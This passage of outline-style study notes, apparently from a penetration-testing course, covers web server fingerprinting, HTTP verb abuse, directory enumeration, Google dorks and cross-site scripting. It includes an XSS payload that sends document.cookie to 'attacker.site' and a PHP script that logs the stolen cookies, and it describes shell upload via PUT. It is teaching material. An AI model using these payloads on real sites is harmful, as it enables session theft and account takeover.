+                - You can use it to establish a connection to an HTTPS service and then send the usual HEAD HTTP Verb.
+                - ```shell
+openssl s_client -connect <target site>:443
+HEAD / HTTP/1.0```
+            - Limits of Manual Fingerprinting:
+                - When performing fingerprinting, one thing to note is that system administrators can customize web servers banners; this is to make the fingerprinting activity harder for attackers.
+                - Automatic tools go beyond banner grabbing. They fingerprint web servers by checking small implementation-dependent details such as:
+                    - Headers ordering in response messages
+                    - Errors handling
+            - Fingerprinting with Httprint
+                - Httprint is a web server fingerprinting tool that uses a signature-based technique to identify web servers.
+                - The most used syntax is pretty simple: `httprint -P0 -h <target hosts> -s <signature file>`
+                    - -P0 to avoid pinging the host (most web servers do not respond to ping echo requests)
+                    - -h <target hosts> tells the tool to fingerprint a list of hosts. It is advised to use the IP address of the hosts you want to test. You can also provide a range of IP addresses
+                    - -s set the signature file to use
+        - HTTP Verbs
+            - The most common HTTP methods are:
+                - GET 
+                - POST
+                - HEAD
+                - PUT DELETE
+            - GET:
+                - GET is used to request a resource. When a user wants to open a web page, the browser sends a GET request.
+                    - ```html
+GET /page.php HTTP/1.1
+Host: www.example.site```
+                - GET can also pass arguments to the web application.
+                    - ```javascript
+GET /page.php?course=PTS HTTP/1.1
+Host: www.example.site```
+            - POST:
+                - POST is used to submit HTML form data. POST parameters must be in the message body.
+                    - ```javascript
+POST /login.php HTTP/1.1
+Host: www.example.site
+
+username=john&password=mypass```
+            - HEAD:
+                - HEAD is very similar to GET, as it asks just headers of the response instead of the response body.
+                    - ```javascript
+HEAD / HTTP/1.1
+Host: www.example.site```
+            - PUT:
+                - PUT is used to upload a file to the server. As you can imagine, it is a very dangerous feature if it is allowed and mis-configured.
+                    - ```javascript
+PUT /path/to/destination HTTP/1.1
+Host: www.example.site
+
+<PUT data>```
+            - DELETE:
+                - DELETE is used to remove a file from the server; this is another feature that must be configured wisely as a misused DELETE leads to denial of service and data loss.
+                    - ```javascript
+DELETE /path/to/destination HTTP/1.1
+Host: www.example.site```
+            - OPTIONS:
+                - OPTIONS is used to query the web server for enabled HTTP Verbs.
+                    - ```javascript
+OPTIONS / HTTP/1.1
+Host: www.example.site```
+            - REST APIs:
+                - Representation State Transfer Application Programming Interface -- existence of web applications.
+                - REST APIs are a specific type of web application that relies strongly on almost all HTTP Verbs.
+                - They are often referred to as "web services" or simply "APIs".
+                - It is common for such applications to use "PUT" for saving data and not for saving files.
+                - Before you report that a "PUT/DELETE" method was found during a penetration testing engagement, you should confirm its exact impact twice.
+                - It is sometimes easy to confuse REST API's PUT method, which simply creates new content with a PUT method that allows us to create an arbitrary file.
+                - After issuing a PUT request, you should try to look for the existence of the file you created.
+            - Using HTTP 1.0 Syntax:
+                - Using the HTTP 1.1 syntax implies also sending a Host: header in your request. If you use HTTP 1.0, you can skip the Host: header.
+                - `OPTIONS / HTTP/1.0`
+            - Exploiting Misconfigured HTTP Verbs:
+                - Enumeration with OPTIONS:
+                    - You can do that by sending an OPTIONS message with Netcat.
+                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FUjGOlKLZe2.png?alt=media&token=923630fb-0d4c-4719-b48a-afdbcec9ccbb)`IMG`
+                - Exploiting DELETE:
+                    - To exploit the DELETE verb, you just have to specify the file you want to delete from the server; this shows how an unauthenticated DELETE method can remove an arbitrary resource on the server.
+                    - `IMG`
+                - Exploiting PUT:
+                    - Exploiting a PUT method is more complex because you have to know the size of the file you want to upload on the server. To do that you can use the Unix utility wc (word counter) with its -m parameter to count how long, in bytes, your payload is.
+                    - `IMG`
+                - Uploading a PHP Shell with PUT:
+                    - The following code contains a small but effective PHP shell.
+                    - `IMG`
+                    - Remember that PUT requires that we pass the content length. 
+                    - Then valid PHP script.
+                    - `IMG`
+        - Directories and File Enumeration
+            - Users or search engines can not find resources that are not linked by a web page on the internet.
+            - Enumeration helps you find those "hidden" resources that often contain:
+                - New and untested features
+                - Backup files
+                - Testing information
+                - Developer's notes
+                - and many other types of information left there because "no one knows their URL".
+            - Discovering unpublished, old or backup files can give you a lot of information and sometimes access to very sensitive files.
+            - There are two ways to enumerate resources:
+                - Pure brute-force
+                - Dictionary attacks
+            - Brute-force Enumeration:
+                - Pure brute-force is very simple; you have to try every possible combination of characters; this is the only way to test for every possible resource name. On the other hand, this method is very inefficient since you will test a lot of non-existing resources.
+            - Dictionary-based Enumeration:
+                - So another, faster, way to enumerate resources is to use a list of common file names, directory names and files extensions.
+                - Using a dictionary to enumerate web resources is much more efficient than using pure brute force.
+            - Enumerating Web Resources with Dirbuster:
+                - Even if you have a dictionary at your disposal, testing all common resources names and extensions by hand would be impractical. Fortunately, this testing process can be automated.
+                - A very common tool to perform web enumeration is OWASP Dirbuster. It is java application that can perform web resources enumeration.
+                - To use it you have to set your target (i.e., the URL of the site you want to test)
+                - You can then choose if you want to perform a pure brute-force or a dictionary-based brute-force.
+                - By clicking on the Browser button, you can specify the list to use for your tests.
+                - Then, you can set the testing options.
+            - Enumerating Web Resources with Dirb:
+                - There is a Linux alternative to Dirbuster, called Dirb.
+                - Dirb is a command line tool which also helps to enumerate web resources within an application.
+        - Google Hacking
+            - Another way to find files and directories on a web site is to use advanced search engine features.
+            - A penetration tester can use Google's advanced query commands, also known as Google Dorks, to find specific resources.
+            - Google dorks are a special combination of Google commands used to find specific resources or web pages.
+            - Here are some useful search commands:
+                -  ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FYXLNlze7bS.png?alt=media&token=1972c949-91f0-4d0e-819e-ba53cdb1befb)
+            - Resources:
+                - [Book](https://www.amazon.com/Google-Hacking-Penetration-Testers-Johnny/dp/1597491764/ref=sr_1_1?ie=UTF8&qid=1302083660&sr=8-1)
+                - [Documentation](https://developers.google.com/custom-search/docs/xml_results)
+                - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database
+)
+        - Cross Site Scripting
+            - Cross Site Scripting (XSS) is a vulnerability that lets an attacker control some of the content of a web application.
+            - By exploiting a Cross Site Scripting, the attacker can target the web application users.
+            - By using an XSS, an attacker can:
+                - Modify the content of the site at run-time;
+                - Inject malicious contents;
+                - Steal the cookies, thus the session, of a user;
+                - Perform actions on the web application as if it was a legitimate user;
+                - And much more!
+            - XSS Actors:
+                - The actors involved in an XSS attack are:
+                    - The vulnerable web site
+                    - The victim user (visitor of the website)
+                    - The penetration tester
+                - Vulnerable Web Applications:
+                    - A vulnerable web application is what makes XSS attacks possilble.
+                    - XSS vulnerabilities happen when a web application uses unfiltered user input to build the output content displayed to its end users; this lets an attacker control the output HTML and JavaScript code, thus attacking the application users.
+                    - In this kind of attack, user input is any parameter coming from the client side of the web app, such as:
+                        - Request headers
+                        - Cookies
+                        - Form inputs
+                        - POST parameters
+                        - GET parameters
+                    - All these input channels should be validated server side by well-implemented security functions that should sanitize or filter users' input.
+                    - The only way to prevent a cross-site scripting vulnerability is to never, ever, trust user input!
+                - Users:
+                    - Most of the time, the victims of XSS attacks are the users or the visitors of a site. Keep in mind that one of the users could be an administrator of the website itself!
+                    - XSS involves injecting malicious code into the output of a web page. This malicious code is then rendered (or executed) by the browser of the visiting users.
+                    - Moreover,if a web application is vulnerable to XSS, it can be really hard for a victim to realize that an attack is in progress; most of the time, attacks are very subtle and do not involve any visible change on the vulnerable site.
+                - Attackers:
+                    - Malicious users exploit XSS vulnerabilities to attack the users of a web site by:
+                        - Making their browsers load malicious content
+                        - Performing operations on their behalf, like buying a product or changing a password
+                        - Stealing their session cookies, thus being able to impersonate them on the vulnerable site
+                    - Impersonating a user can lead to an entire web site takeover.
+            - Finding an XSS:
+                - To find an XSS you have to look at every user input, and test if it is somehow displayed on the output (reflection point) of the web application.
+                - After finding a reflection point, you have to understand if you can inject HTML code and see if it somehow gets to the output of the page; this lets you control the output page!
+                - You can use any valid HTML tag and try to understand if it gets to the page. Looking at the HTML sources of the output page helps to understand how to build an XSS payload.
+                - Sometimes it is just a matter of injecting a harmless tag like <i>, <pre>, or <plaintext>.
+                - To test XSS, you can inject some valid HTML/ JavaScript code, like `<script>alert('XSS')</script>`
+                - To exploit an XSS vulnerability that you find, you need to know the type of cross-site scripting attack you are carrying out. Cross-site scripting vulnerabilities can be reflected, persistent or DOM Based.
+            - Reflected XSS Attacks:
+                - Reflected attacks happen when the malicious payload is carried inside the request that the browser of the victim sends to the vulnerable website.
+                - They could be triggered by posting a link on a social network or via a phishing campaign. When users click on the link, they trigger the attack.
+                - Reflected XSS Filters:
+                    - Some browsers, like Google Chrome, have a reflected XSS filter built in. This means that they will not run some XSS reflected attacks.
+                    - The reality is that they can only filter trivial and known XSS attacks. There are advanced attacks that can bypass Anti-XSS filters.
+                - Persistent XSS Attacks:
+                    - Persistent XSS attacks occur when the payload is sent to the vulnerable web server and then stored. When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload.
+                    - It is called persistent because the malicious code gets delivered each and every time a web browser hits the "injected" web page.
+                    - This is a very dangerous form of XSS because, with a single attack, the hacker can exploit multiple web application users.
+                    - The most common vector for persistent attacks are HTML forms that submit content to the web server and then display that content back to the users.
+                    - Elements such as comments, user profiles, and forum posts are a potential vector for XSS attacks.
+                - Cookie Stealing via XSS:
+                    - JavaScript can access cookies if they do not have the HttpOnly flag enabled; this means that an XSS attack can be used to steal the cookies. In many cases, stealing a cookie means stealing a user session!
+                    - `<script> alert(document.cookie)</script>`
+                    - ```javascript
+<script>
+  var i=new Image();
+	i.src="http://attacker.site/log.php?q="+document.cookie;
+</script>```
+                    - The log.php script saves the cookie in a text file on the attacker.site:
+                    - ```javascript
+<?php
+$filename="/tmp/log.txt";
+$fp=fopen($filename, 'a');
+$cookie=$_GET['q'];
+fwrite($fp, $cookie);
+fclose($fp);
+?>```
+                - Resources:
+                    - The Web Application Hacker's Handbook
+                    - OWASP-XSS
+        - SQL Injections
